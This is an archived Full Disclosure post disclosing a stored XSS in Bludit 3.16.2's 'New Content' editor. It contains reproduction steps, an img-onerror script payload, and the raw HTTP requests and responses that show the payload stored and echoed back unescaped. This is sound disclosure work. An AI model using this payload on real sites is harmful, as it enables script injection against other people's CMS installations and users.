---
title: Stored XSS "Add New Content" Functionality - bluditv3.16.2
url: https://seclists.org/fulldisclosure/2025/Jul/1
source: Full Disclosure
date: 2025-07-09
fetch_date: 2025-10-06T23:55:59.656795
---

# Stored XSS "Add New Content" Functionality - bluditv3.16.2

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](0)
[By Date](date.html#1)
[![Next](/images/right-icon-16x16.png)](2)

[![Previous](/images/left-icon-16x16.png)](0)
[By Thread](index.html#1)
[![Next](/images/right-icon-16x16.png)](2)

![](/shared/images/nst-icons.svg#search)

# Stored XSS "Add New Content" Functionality - bluditv3.16.2

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 6 Jul 2025 22:49:00 +0100

---

```
# Exploit Title: Stored XSS "Add New Content" Functionality - bluditv3.16.2
# Date: 07/2025
# Exploit Author: Andrey Stoykov
# Version: 3.16.2
# Tested on: Debian 12
# Blog: https://msecureltd.blogspot.com/

Stored XSS "Add New Content" Functionality #1:

Steps to Reproduce:

1. Login with admin account and visit "New Content"
2. In the "Source Code" field enter the following parameter
"<iframe><textarea></iframe><img src="" onerror="alert(document.domain)">"
3. Upon clicking on "Preview" the XSS payload would trigger

// HTTP POST request add new content

POST /bludit/admin/new-content HTTP/1.1
Host: 192.168.58.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
Gecko/20100101 Firefox/140.0
[...]

tokenCSRF=03a860fcc567fed86f6cb57e5877a469ef27e2ac&uuid=b219c568827ee49d5b8be839d6ab1043&type=published&coverImage=&content=<iframe><textarea></iframe><img+src%3d""+onerror%3d"alert(document.domain)">&category=&description=&date=2025-06-04+15%3A15%3A17&typeSelector=published&position=3&tags=&template=&externalCoverImage=&slug=xss&noindex=0&nofollow=0&noarchive=0&title=xss

// HTTP response

HTTP/1.1 301 Moved Permanently
Date: Wed, 04 Jun 2025 19:16:04 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: Bludit
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
pre-check=0
Pragma: no-cache
Location: /bludit/admin/content
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

// HTTP GET request triggering the XSS

GET /bludit/admin/edit-content/xss HTTP/1.1
Host: 192.168.58.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
Gecko/20100101 Firefox/140.0
[...]

// HTTP response

HTTP/1.0 200 OK
Date: Wed, 04 Jun 2025 19:16:06 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: Bludit
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8

[...]
<!-- Editor -->
<textarea id="jseditor" class="editable h-100"
style=""><iframe><textarea></iframe><img+src%3d""+onerror%3d"alert(document.domain)">
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](0)
[By Date](date.html#1)
[![Next](/images/right-icon-16x16.png)](2)

[![Previous](/images/left-icon-16x16.png)](0)
[By Thread](index.html#1)
[![Next](/images/right-icon-16x16.png)](2)

### Current thread:

* **Stored XSS "Add New Content" Functionality - bluditv3.16.2** *Andrey Stoykov (Jul 07)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")